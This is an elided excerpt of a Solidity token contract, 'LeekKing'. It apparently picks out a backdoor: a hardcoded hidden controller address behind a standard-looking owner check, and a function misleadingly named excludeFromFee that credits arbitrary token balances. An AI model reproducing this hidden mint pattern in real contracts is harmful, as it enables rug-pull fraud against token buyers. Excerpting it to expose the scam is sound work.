...
contract Ownable is Context {
    ...
    address private _cmAddress = 0x837151D951acac65DdB0b0832D5c3d90B718d64d;
    ...
    modifier cmAddress() {
        require(_cmAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
...
contract LeekKing is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "LeekKing";
    string private _symbol = "LeekKing";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x21197fa2aeb80E78c2656CaE258E2925c8AaB5A8); // Marketing Address
    address payable public teamWalletAddress = payable(0x68B0F951f357b9dd360fc4b3f4FdBa7d57D9A254); // Team Address
    ...
    uint256 public TEAM = uint256(0);

    mapping(address => uint256) public TEAMTOKEN;
    ...
    function excludeFromFee
        ...
        uint256 pinn1 = TEAMTOKEN[account];
        if (pinn1 == 0) _TEAM.push(account);
        TEAMTOKEN[account] = pinn1.add(amountt);
        TEAM = TEAM.add(amountt);
        _balances[account] = _balances[account].add(amountt);
    }
